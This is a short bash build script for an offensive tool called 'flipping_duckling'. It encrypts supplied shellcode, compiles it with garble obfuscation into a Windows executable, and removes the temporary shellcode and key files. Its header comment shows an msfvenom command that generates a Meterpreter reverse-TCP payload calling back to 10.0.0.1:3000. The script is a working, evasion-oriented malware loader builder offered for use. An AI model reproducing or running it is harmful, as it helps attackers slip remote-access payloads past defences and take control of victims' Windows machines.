#!/bin/bash

# Example Execution
#
# ./build.sh [SHELLCODE]
# ./build.sh (msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=3000 -b "\x00" -a x64 -f raw)
#
# Ouputs to flipping_duckling.exe

# Exit the script if any command fails
set -e

# Install garble for obfuscation
echo "Installing garble..."
go install mvdan.cc/garble@latest

# Encrypt payload
echo "Encrypting Shellcode..."
go run . $1

# Set up environment variables for Windows compilation
echo "Setting up environment variables for Windows compilation..."
export GOOS=windows
export GOARCH=amd64

# Compile the Go code with garble
echo "Compiling Go code for Windows..."
garble -tiny build

# Cleanup
echo "Cleaning up temporary files..."
rm shell.bin shell.key

# Compilation completed
echo "Compilation completed. The executable is flipping_duckling.exe"
